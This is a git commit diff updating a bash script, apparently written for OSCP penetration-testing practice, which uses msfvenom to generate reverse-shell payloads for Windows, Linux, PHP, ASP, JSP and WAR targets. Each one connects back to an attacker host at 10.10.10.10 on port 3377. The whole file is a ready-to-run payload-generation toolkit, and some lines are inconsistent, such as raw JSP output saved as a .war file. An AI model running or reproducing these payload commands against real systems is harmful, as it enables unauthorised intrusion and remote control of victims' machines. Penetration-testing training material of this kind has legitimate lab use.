359a17a7e40269d75c03e1f96cfcf0da7bb5e50c
Michel <michel@woodenshoe.org>
2021-06-23 19:52:06 +0200

    update create venom script

--- install/oscp/script/create-venom.sh
+++ install/oscp/script/create-venom.sh
@@ -1,14 +1,36 @@
 #!/bin/bash
 
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > ~/reverse-shell/v-shell.exe
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f aspx > ~/reverse-shell/v-shell.aspx
+## Windows
+#Stageless Payloads
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f exe > ~/reverse-shell/v-shell.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f aspx > ~/reverse-shell/v-shell.aspx
 
-msfvenom -p cmd/unix/reverse_python LHOST=10.10.10.10 LPORT=4444 -f raw > ~/reverse-shell/v-shell.py
-msfvenom -p cmd/unix/reverse_bash LHOST=10.10.10.10 LPORT=4444 -f raw > ~/reverse-shell/v-shell.sh
+#Staged Payloads
+msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f exe > ~/reverse-shell/sv-shell.exe
+msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f aspx > ~/reverse-shell/sv-shell.aspx
 
+##Linux
+msfvenom -p cmd/unix/reverse_python LHOST=10.10.10.10 LPORT=3377 -f raw > ~/reverse-shell/v-shell.py
+msfvenom -p cmd/unix/reverse_bash LHOST=10.10.10.10 LPORT=3377 -f raw > ~/reverse-shell/v-shell.sh
 
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > ~/reverse-shell/v-shell.jsp
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > ~/reverse-shell/v-shell.war
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f war -o ~/reverse-shell/v-shell2.war
+#Staged Payloads
+msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f elf > shell-x86.elf
+msfvenom -p linux/x64/shell/reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f elf > shell-x64.elf
+
+#Stageless Payloads
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f elf > shell-x86.elf
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f elf > shell-x64.elf
+
+##Web
+msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=3377 -f raw > shell.php
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f war > shell.war
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f raw > shell.jsp
+msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f asp > s-shell.asp
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f asp > shell.asp
+
+##Java
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f raw > ~/reverse-shell/v-shell.jsp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f raw > ~/reverse-shell/v-shell.war
+msfvenom -p windows/x64/shell/reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f war -o ~/reverse-shell/v-shell2.war
 
 #unpack war file for jsp file
